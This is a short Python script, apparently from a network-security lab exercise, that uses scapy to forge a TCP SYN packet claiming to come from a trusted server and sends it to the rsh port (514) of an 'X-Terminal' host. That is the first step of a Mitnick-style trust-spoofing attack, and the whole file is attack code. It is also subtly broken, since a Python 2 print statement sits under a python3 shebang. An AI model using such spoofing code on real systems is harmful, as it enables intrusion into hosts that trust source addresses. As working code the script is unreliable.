#!/usr/bin/python3
from scapy.all import *
x_ip      = "10.0.2.10"  # X-Terminal
x_port    = 514         # Port number used by X-Terminal
srv_ip    = "10.0.2.15"  # The trusted server
srv_port  = 1023        # Port number used by the trusted server
ip_packet = IP(src=srv_ip,dst=x_ip)
tcp_packet = TCP(sport=1023,dport=514,flags='S',seq=1000,ack=2000)
pkt = ip_packet/tcp_packet
print "My spoof packet from Trusted server to X-terminal \n"
print("{}:{} -> {}:{}  Flags={} Seq_number = {} Ack = {}".format(ip_packet.src,tcp_packet.sport,ip_packet.dst, tcp_packet.dport,tcp_packet.flags,tcp_packet.seq,tcp_packet.ack))
send(pkt)
